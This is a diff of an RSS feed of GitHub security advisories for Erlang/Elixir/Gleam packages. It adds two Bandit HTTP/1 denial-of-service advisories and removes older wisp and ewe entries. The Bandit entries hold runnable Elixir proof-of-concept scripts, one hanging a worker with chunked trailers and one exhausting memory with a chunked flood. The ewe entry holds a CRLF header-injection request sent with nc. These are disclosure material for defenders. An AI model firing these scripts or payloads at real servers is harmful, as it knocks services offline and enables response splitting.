@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/erlang.rss</id>
     <title>Security Advisory for Erlang/Elixir packages hosted at hex.pm</title>
-    <updated>2026-05-19T18:32:01.600Z</updated>
+    <updated>2026-05-19T19:31:00.556Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aerlang"/>
     <subtitle>Security Advisory for Erlang/Elixir packages hosted at hex.pm on GitHub</subtitle>
@@ -11,6 +11,221 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[bandit] Bandit: Unauthenticated DoS via chunked request trailers in Bandit HTTP/1 decoder]]></title>
+        <id>https://github.com/advisories/GHSA-rf5q-vwxw-gmrf</id>
+        <link href="https://github.com/advisories/GHSA-rf5q-vwxw-gmrf"/>
+        <updated>2026-05-19T19:25:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A worker-pinning denial of service in Bandit's HTTP/1 chunked transfer decoder. Any unauthenticated client that sends a <code>Transfer-Encoding: chunked</code> request whose body ends with a trailer field (RFC 9112 §7.1.2 explicitly permits this) causes the connection's worker process to spin forever in an infinite recursion. A handful of concurrent connections are sufficient to exhaust the listener pool and render the server unresponsive to all further traffic.</p>
+<p>The vulnerability was likely introduced with this commit on <code>Dec 6, 2024</code>: <a href="https://github.com/mtrudel/bandit/commit/e73e379ab59840e8561b5730878f16e29ab06217">https://github.com/mtrudel/bandit/commit/e73e379ab59840e8561b5730878f16e29ab06217</a></p>
+<h3 id="details">Details</h3>
+<p>The bug is in <code>lib/bandit/http1/socket.ex</code> in <code>do_read_chunked_data!/5</code> (around lines 242–274). The terminator clause matches only <code>["0", "\r\n" &lt;&gt; rest]</code> — i.e. the last-chunk line <code>0\r\n</code> followed <em>immediately</em> by the empty trailer line. RFC 9112 §7.1.2 allows zero or more trailer fields between <code>0\r\n</code> and the final <code>\r\n</code>, e.g. a body ending <code>0\r\nX-T: v\r\n\r\n</code>.</p>
+<p>When trailers are present, <code>:binary.split/2</code> returns <code>["0", "X-T: v\r\n\r\n"]</code>. The terminator clause does not match. The inner <code>&lt;&lt;_::binary-size(0), ?\r, ?\n, _::binary&gt;&gt;</code> pattern also does not match because <code>rest</code> starts with <code>X</code>. Execution falls into the <code>_ -&gt;</code> arm, which computes <code>to_read = 0 - byte_size(rest)</code> (a negative number) and calls <code>read_available!/2</code> on the socket. On timeout, <code>read_available!/2</code> returns <code>&lt;&lt;&gt;&gt;</code>, leaving the buffer unchanged. <code>do_read_chunked_data!/5</code> then tail-recurses with the same state and makes no forward progress. The worker is pinned for the lifetime of the TCP connection.</p>
+<p>The same shape applies to malformed chunk frames where the declared chunk-size disagrees with the actual data length: the binary-size pattern cannot match and <code>read_available!</code> is repeatedly called with no progress.</p>
+<p>The gap is acknowledged in the source itself — the comment on line 245 reads: <em>"We should be reading (and ignoring) trailers here"</em>.</p>
+<p><strong>Suggested fix:</strong> after the <code>0</code> size line, consume bytes up to <code>\r\n\r\n</code> (parsing/discarding trailers via <code>:erlang.decode_packet(:httph_bin, …)</code>) before returning. Additionally, ensure every recursive arm makes forward progress — when <code>read_available!/2</code> returns <code>&lt;&lt;&gt;&gt;</code>, raise <code>request_error!(:request_timeout)</code> rather than re-entering with an unchanged buffer.</p>
+<h3 id="poc">PoC</h3>
+<p>A self-contained reproduction script is available below. It starts Bandit 1.10 on <code>127.0.0.1:4321</code> with a trivial echo Plug, opens a TCP connection, and sends a single chunked POST whose body is:</p>
+<ul>
+<li>one 5-byte chunk <code>"hello"</code></li>
+<li>the last-chunk marker <code>0\r\n</code></li>
+<li>one trailer field <code>X-Trailer: 1\r\n</code></li>
+<li>the terminating <code>\r\n</code></li>
+</ul>
+<p>The request is fully RFC-conformant; many fronting proxies (NGINX, HAProxy) emit this exact shape when forwarding trailer-bearing requests. A correct server responds within milliseconds. With the bug, <code>:gen_tcp.recv/3</code> times out after 10 seconds because the worker is stuck spinning in <code>do_read_chunked_data!/5</code>.</p>
+<p>Steps to reproduce:</p>
+<ol>
+<li><code>elixir script.exs</code></li>
+<li>Observe the <code>TIMEOUT — worker is pinned in do_read_chunked_data!/5</code> log line.</li>
+<li>Each additional concurrent client sending the same request consumes one more worker process.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Unauthenticated denial of service against any Bandit-fronted HTTP/1 service that accepts chunked request bodies — the default for Phoenix and Plug applications. No authentication, no special headers, and no large payload are required; a small number of attacker-controlled connections is enough to exhaust the worker pool and make the server unreachable for all users. Servers sitting behind proxies that legitimately forward trailer-bearing requests can also be affected without any malicious client involvement.</p>
+<h3 id="script-and-logs">Script and Logs</h3>
+<pre><code class="language-elixir"># Bandit HTTP/1 chunked decoder hangs on requests with trailer headers.
+#
+# lib/bandit/http1/socket.ex:242-274 (do_read_chunked_data!/5) terminates
+# only when the last-chunk line `0\r\n` is followed *immediately* by the
+# empty trailer line `\r\n`. RFC 9112 §7.1.2 allows trailer fields between
+# them (e.g. `0\r\nX-T: v\r\n\r\n`). With trailers present, none of the
+# match clauses fit: the `_` arm computes `to_read = 0 - byte_size(rest)`
+# (negative), calls read_available!/2, gets &lt;&lt;&gt;&gt; on timeout, and recurses
+# with the same buffer forever — pinning the worker for the connection's
+# lifetime. The line 245 comment ("We should be reading (and ignoring)
+# trailers here") acknowledges the gap.
+#
+# This script starts Bandit 1.10 on 127.0.0.1:4321, sends one chunked POST
+# whose body ends with a single trailer field, and waits for a response.
+# A correct server replies in milliseconds; the buggy decoder never does.
+#
+# Run: elixir script.exs
+
+Mix.install([
+  {:bandit, "~&gt; 1.10"},
+  {:plug, "~&gt; 1.19"}
+])
+
+defmodule EchoApp do
+  @behaviour Plug
+  def init(opts), do: opts
+
+  def call(conn, _opts) do
+    {:ok, body, conn} = Plug.Conn.read_body(conn)
+    Plug.Conn.send_resp(conn, 200, "got #{byte_size(body)} bytes")
+  end
+end
+
+defmodule TrailerHang do
+  @port 4321
+  @recv_timeout_ms 10_000
+
+  def run do
+    {:ok, _} = Bandit.start_link(plug: EchoApp, ip: {127, 0, 0, 1}, port: @port)
+
+    {:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", @port, [:binary, active: false])
+
+    request = build_chunked_request_with_trailer()
+    log("Sending chunked POST whose body ends with `0\\r\\nX-Trailer: 1\\r\\n\\r\\n`.")
+    :ok = :gen_tcp.send(sock, request)
+
+    log("Waiting up to #{div(@recv_timeout_ms, 1000)}s for a response (a correct server replies in ms)…")
+    started_at = System.monotonic_time(:millisecond)
+
+    case :gen_tcp.recv(sock, 0, @recv_timeout_ms) do
+      {:ok, response} -&gt;
+        elapsed = System.monotonic_time(:millisecond) - started_at
+        log("Got response after #{elapsed}ms — server handles trailers correctly:")
+        IO.puts(binary_part(response, 0, min(byte_size(response), 256)))
+
+      {:error, :timeout} -&gt;
+        log("TIMEOUT — worker is pinned in do_read_chunked_data!/5.")
+        log("Each concurrent client sending this shape consumes one Bandit worker.")
+
+      {:error, reason} -&gt;
+        log("Connection error: #{inspect(reason)}")
+    end
+
+    :gen_tcp.close(sock)
+  end
+
+  # Body: one 5-byte chunk "hello", last-chunk marker `0\r\n`, one trailer
+  # `X-Trailer: 1\r\n`, terminating `\r\n`. RFC-conformant; many proxies
+  # (NGINX, HAProxy) emit this shape when forwarding trailer-bearing
+  # responses or requests.
+  defp build_chunked_request_with_trailer do
+    "POST / HTTP/1.1\r\n" &lt;&gt;
+      "Host: 127.0.0.1:#{@port}\r\n" &lt;&gt;
+      "Transfer-Encoding: chunked\r\n" &lt;&gt;
+      "Trailer: X-Trailer\r\n" &lt;&gt;
+      "Content-Type: application/octet-stream\r\n" &lt;&gt;
+      "\r\n" &lt;&gt;
+      "5\r\nhello\r\n" &lt;&gt;
+      "0\r\n" &lt;&gt;
+      "X-Trailer: 1\r\n" &lt;&gt;
+      "\r\n"
+  end
+
+  defp log(message), do: IO.puts("[#{Time.utc_now() |&gt; Time.truncate(:millisecond)}] #{message}")
+end
+
+TrailerHang.run()
+</code></pre>
+<pre><code class="language-logs">12:36:54.260 [info] Running EchoApp with Bandit 1.10.4 at 127.0.0.1:4321 (http)
+[10:36:54.275] Sending chunked POST whose body ends with `0\r\nX-Trailer: 1\r\n\r\n`.
+[10:36:54.276] Waiting up to 10s for a response (a correct server replies in ms)…
+[10:37:04.276] TIMEOUT — worker is pinned in do_read_chunked_data!/5.
+[10:37:04.276] Each concurrent client sending this shape consumes one Bandit worker.
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-rf5q-vwxw-gmrf">https://github.com/mtrudel/bandit/security/advisories/GHSA-rf5q-vwxw-gmrf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39806">https://nvd.nist.gov/vuln/detail/CVE-2026-39806</a></li>
+<li><a href="https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab">https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab</a></li>
+<li><a href="https://cna.erlef.org/cves/CVE-2026-39806.html">https://cna.erlef.org/cves/CVE-2026-39806.html</a></li>
+<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-39806">https://osv.dev/vulnerability/EEF-CVE-2026-39806</a></li>
+<li><a href="https://github.com/advisories/GHSA-rf5q-vwxw-gmrf">https://github.com/advisories/GHSA-rf5q-vwxw-gmrf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rf5q-vwxw-gmrf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T19:25:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[bandit] Bandit: Unauthenticated one-shot DoS via `Transfer-Encoding: chunked`]]></title>
+        <id>https://github.com/advisories/GHSA-9q9q-324x-93r2</id>
+        <link href="https://github.com/advisories/GHSA-9q9q-324x-93r2"/>
+        <updated>2026-05-19T19:23:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Bandit's HTTP/1 chunked-body reader silently drops the request size cap that the application configures (e.g. <code>Plug.Parsers</code>' default 8 MB <code>length:</code>) and buffers the entire body in memory before the application sees it. An unauthenticated attacker can crash any Bandit-fronted Phoenix/Plug app (BEAM OOM) with a single <code>Transfer-Encoding: chunked</code> request to any URL.</p>
+<h3 id="details">Details</h3>
+<p>In <code>lib/bandit/http1/socket.ex:189</code>, the chunked clause of <code>read_data/2</code> only forwards <code>:read_length</code> and <code>:read_timeout</code> to <code>do_read_chunked_data!/5</code> (<code>:242</code>); the caller-supplied <code>:length</code> cap is dropped. The recursion accumulates every chunk into an iolist and <code>IO.iodata_to_binary/1</code> (<code>:196</code>) materializes the whole thing as one binary. The function always returns <code>{:ok, body, ...}</code> — never <code>{:more, ...}</code> — so callers cannot interpose a 413.</p>
+<p>The content-length sibling at <code>:210</code> does the right thing:</p>
+<pre><code class="language-elixir">max_to_return = min(unread_content_length, Keyword.get(opts, :length, 8_000_000))
+</code></pre>
+<p>Because <code>Plug.Parsers</code> runs before routing and auth in the standard Phoenix endpoint, the attacker needs no credentials and no valid route — any <code>Content-Type</code> matching a configured parser (<code>:json</code>, <code>:urlencoded</code>, <code>:multipart</code>) on any path triggers the bug.</p>
+<p><strong>Suggested Fix:</strong> track accumulated bytes in <code>do_read_chunked_data!</code> and either return <code>{:more, ...}</code> or raise <code>request_error!</code> once <code>:length</code> is exceeded, mirroring the content-length path.</p>
+<h3 id="poc">PoC</h3>
+<p>Self-contained — boots a Bandit server with a realistic <code>Plug.Parsers</code> (<code>length: 8_000_000</code>) and floods it. Save as <code>chunked_oom.exs</code>, run <code>elixir chunked_oom.exs</code>, and watch <code>beam.smp</code> RSS climb past 8 MB until the OS OOM-killer fires.</p>
+<pre><code class="language-elixir">Mix.install([{:bandit, "~&gt; 1.10"}, {:plug, "~&gt; 1.19"}])
+
+defmodule DemoApp do
+  use Plug.Builder
+
+  # The `length` option here is ignored by the attack
+  plug Plug.Parsers, parsers: [:urlencoded, :json], pass: ["*/*"], json_decoder: JSON, length: 8_000_000
+  plug :respond
+
+  def respond(conn, _), do: Plug.Conn.send_resp(conn, 200, "ok")
+end
+
+{:ok, _} = Bandit.start_link(plug: DemoApp, ip: {127, 0, 0, 1}, port: 4321)
+
+# Builds a single 1MB chunk that is reused on the client-side but accumulated on the server-side.
+chunk = :binary.copy(&lt;&lt;?A&gt;&gt;, 1_048_576)
+frame = "#{Integer.to_string(1_048_576, 16)}\r\n#{chunk}\r\n"
+
+{:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", 4321, [:binary, active: false])
+
+:ok =
+  :gen_tcp.send(sock, """
+  POST / HTTP/1.1\r
+  Host: 127.0.0.1\r
+  Transfer-Encoding: chunked\r
+  Content-Type: application/json\r
+  Connection: close\r
+  \r
+  """)
+
+Enum.each(1..10_240, fn _ -&gt; :ok = :gen_tcp.send(sock, frame) end)
+:ok = :gen_tcp.send(sock, "0\r\n\r\n")
+
+IO.inspect(:gen_tcp.recv(sock, 0, 120_000))
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Unauthenticated pre-route DoS via BEAM memory exhaustion. One request from one connection crashes the server. Affects every Bandit-fronted application that reads request bodies anywhere — i.e. essentially every Phoenix app, since the default endpoint mounts <code>Plug.Parsers</code> ahead of routing and auth. Configured <code>length:</code> caps on <code>Plug.Parsers</code> and <code>Plug.Conn.read_body/2</code> are silently ineffective on the chunked path.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-9q9q-324x-93r2">https://github.com/mtrudel/bandit/security/advisories/GHSA-9q9q-324x-93r2</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39803">https://nvd.nist.gov/vuln/detail/CVE-2026-39803</a></li>
+<li><a href="https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab">https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab</a></li>
+<li><a href="https://cna.erlef.org/cves/CVE-2026-39803.html">https://cna.erlef.org/cves/CVE-2026-39803.html</a></li>
+<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-39803">https://osv.dev/vulnerability/EEF-CVE-2026-39803</a></li>
+<li><a href="https://github.com/advisories/GHSA-9q9q-324x-93r2">https://github.com/advisories/GHSA-9q9q-324x-93r2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9q9q-324x-93r2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T19:23:49.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[postgrex] Postgrex: Channel-name SQL injection in `Postgrex.Notifications.listen/3`]]></title>
         <id>https://github.com/advisories/GHSA-r73h-97w8-m54h</id>
@@ -1801,127 +2016,5 @@ Bomb.run()
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-05T21:46:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[wisp] wisp has Allocation of Resources Without Limits or Throttling]]></title>
-        <id>https://github.com/advisories/GHSA-8645-p2v4-73r2</id>
-        <link href="https://github.com/advisories/GHSA-8645-p2v4-73r2"/>
-        <updated>2026-04-06T23:17:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A multipart form parsing bug allows any unauthenticated user to bypass configured request size limits and trigger a denial of service by exhausting server memory or disk.</p>
-<h3 id="details">Details</h3>
-<p>The issue is in the multipart parsing logic, specifically in <code>multipart_body</code> and <code>multipart_headers</code>.</p>
-<p>When parsing multipart data, the implementation distinguishes between:</p>
-<ul>
-<li>chunks where a boundary is found</li>
-<li>chunks where more data is required</li>
-</ul>
-<p>In the normal case (boundary found), the parser correctly accounts for consumed bytes by calling <code>decrement_quota</code>.</p>
-<p>However, in the <code>MoreRequiredForBody</code> branch, the parser appends incoming data to the output but recurses without decrementing the quota. This means that any chunk that does not contain the multipart boundary is effectively “free” from a quota perspective. Only the final chunk, the one containing the boundary, is counted.</p>
-<p>The same pattern exists in <code>multipart_headers</code>, where <code>MoreRequiredForHeaders</code> also recurses without decrementing the quota.</p>
-<p>As a result, an attacker can send arbitrarily large multipart bodies split across many chunks that avoid the boundary. The parser will accumulate the data (in memory for form fields, on disk for file uploads) without enforcing <code>max_body_size</code> or <code>max_files_size</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>This is a denial of service vulnerability caused by uncontrolled resource consumption.</p>
-<p>Any application using <code>require_form</code> or <code>require_multipart_form</code> on user-controlled input is affected. An unauthenticated attacker can send large multipart requests that bypass configured limits and cause:</p>
-<ul>
-<li>memory exhaustion (for form fields accumulated in memory)</li>
-<li>disk exhaustion (for file uploads written to temporary storage)</li>
-</ul>
-<p>In both cases, the application may become unavailable or be terminated by the operating system.</p>
-<h3 id="workaround">Workaround</h3>
-<p>Deploy a reverse proxy (such as nginx or HAProxy) in front of the application and enforce request body size limits there. This ensures large multipart requests are rejected before they reach the vulnerable parser.</p>
-<h3 id="resources">Resources</h3>
-<ul>
-<li>Introducing commit: <a href="https://github.com/gleam-wisp/wisp/commit/d8e722e22ccb42bda9d0b6248658d37ab4e9b376">https://github.com/gleam-wisp/wisp/commit/d8e722e22ccb42bda9d0b6248658d37ab4e9b376</a></li>
-<li>Fix commit: <a href="https://github.com/gleam-wisp/wisp/commit/7a978748e12ab29db232c222254465890e1a4a90">https://github.com/gleam-wisp/wisp/commit/7a978748e12ab29db232c222254465890e1a4a90</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gleam-wisp/wisp/security/advisories/GHSA-8645-p2v4-73r2">https://github.com/gleam-wisp/wisp/security/advisories/GHSA-8645-p2v4-73r2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32145">https://nvd.nist.gov/vuln/detail/CVE-2026-32145</a></li>
-<li><a href="https://github.com/gleam-wisp/wisp/commit/7a978748e12ab29db232c222254465890e1a4a90">https://github.com/gleam-wisp/wisp/commit/7a978748e12ab29db232c222254465890e1a4a90</a></li>
-<li><a href="https://cna.erlef.org/cves/CVE-2026-32145.html">https://cna.erlef.org/cves/CVE-2026-32145.html</a></li>
-<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-32145">https://osv.dev/vulnerability/EEF-CVE-2026-32145</a></li>
-<li><a href="https://github.com/advisories/GHSA-8645-p2v4-73r2">https://github.com/advisories/GHSA-8645-p2v4-73r2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8645-p2v4-73r2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-03T03:40:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ewe] ewe Has Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Request/Response Splitting)]]></title>
-        <id>https://github.com/advisories/GHSA-x2w3-23jr-hrpf</id>
-        <link href="https://github.com/advisories/GHSA-x2w3-23jr-hrpf"/>
-        <updated>2026-04-06T17:25:11.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>encode_headers</code> function in <code>src/ewe/internal/encoder.gleam</code> directly interpolates response header keys and values into raw HTTP bytes without validating or stripping CRLF (<code>\r\n</code>) sequences. An application that passes user-controlled data into response headers (e.g., setting a <code>Location</code> redirect header from a request parameter) allows an attacker to inject arbitrary HTTP response content, leading to response splitting, cache poisoning, and possible cross-site scripting.</p>
-<p>Notably, ewe <em>does</em> validate CRLF in <strong>incoming</strong> request headers via <code>validate_field_value()</code> in the HTTP/1.1 parser — but provides no equivalent protection for <strong>outgoing</strong> response headers in the encoder.</p>
-<h3 id="details">Details</h3>
-<p><strong>File:</strong> <code>src/ewe/internal/encoder.gleam</code></p>
-<p><strong>Vulnerable code:</strong></p>
-<pre><code class="language-gleam">fn encode_headers(headers: List(#(String, String))) -&gt; BitArray {
-  let headers =
-    list.fold(headers, &lt;&lt;&gt;&gt;, fn(acc, headers) {
-      let #(key, value) = headers
-      &lt;&lt;acc:bits, key:utf8, ": ", value:utf8, "\r\n"&gt;&gt;
-    })
-
-  &lt;&lt;headers:bits, "\r\n"&gt;&gt;
-}
-</code></pre>
-<p>Both <code>key</code> and <code>value</code> are embedded directly into the <code>BitArray</code> output. If either contains <code>\r\n</code>, the resulting bytes become a structurally valid but attacker-controlled HTTP response, terminating the current header early and injecting new headers or a second HTTP response.</p>
-<p><strong>Contrast with request parsing</strong> (<code>src/ewe/internal/http1.gleam</code>): incoming header values are protected:</p>
-<pre><code class="language-gleam">use value &lt;- try(
-  validate_field_value(value) |&gt; replace_error(InvalidHeaders)
-)
-</code></pre>
-<p>No analogous validation exists for outgoing header values in the encoder. The solution is to strip or reject <code>\r</code> (0x0D) and <code>\n</code> (0x0A) from all header key and value strings in <code>encode_headers</code> before encoding, mirroring the validation already applied to incoming request headers via <code>validate_field_value()</code></p>
-<h3 id="poc">PoC</h3>
-<p>An ewe application echoes a user-supplied redirect URL into a <code>Location</code> header:</p>
-<pre><code class="language-gleam">fn handle_request(req: Request) -&gt; Response {
-  let redirect_url =
-    request.get_query(req)
-    |&gt; result.try(list.key_find(_, "next"))
-    |&gt; result.unwrap("/home")
-
-  response.new(302)
-  |&gt; response.set_header("location", redirect_url)
-  |&gt; response.set_body(ewe.Empty)
-}
-</code></pre>
-<p>Attacker request:</p>
-<pre><code class="language-bash">printf 'GET /?next=https://example.com%%0d%%0aX-Injected:%%20true HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc -w 2 localhost 8080
-</code></pre>
-<p>Resulting response:</p>
-<pre><code>HTTP/1.1 302 Found
-location: https://example.com
-X-Injected: true
-content-length: 0
-date: Tue, 24 Mar 2026 07:53:00 GMT
-connection: keep-alive
-
-</code></pre>
-<p>The <code>X-Injected: true</code> header appears as a separate response header, confirming that CRLF sequences in user input are not sanitized by the encoder.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vshakitskiy/ewe/security/advisories/GHSA-x2w3-23jr-hrpf">https://github.com/vshakitskiy/ewe/security/advisories/GHSA-x2w3-23jr-hrpf</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34715">https://nvd.nist.gov/vuln/detail/CVE-2026-34715</a></li>
-<li><a href="https://github.com/vshakitskiy/ewe/commit/ce4ff214d32626a10fda9398dc94a2d720e17446">https://github.com/vshakitskiy/ewe/commit/ce4ff214d32626a10fda9398dc94a2d720e17446</a></li>
-<li><a href="https://github.com/vshakitskiy/ewe/releases/tag/v3.0.6">https://github.com/vshakitskiy/ewe/releases/tag/v3.0.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-x2w3-23jr-hrpf">https://github.com/advisories/GHSA-x2w3-23jr-hrpf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x2w3-23jr-hrpf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-01T22:18:27.000Z</published>
     </entry>
 </feed>
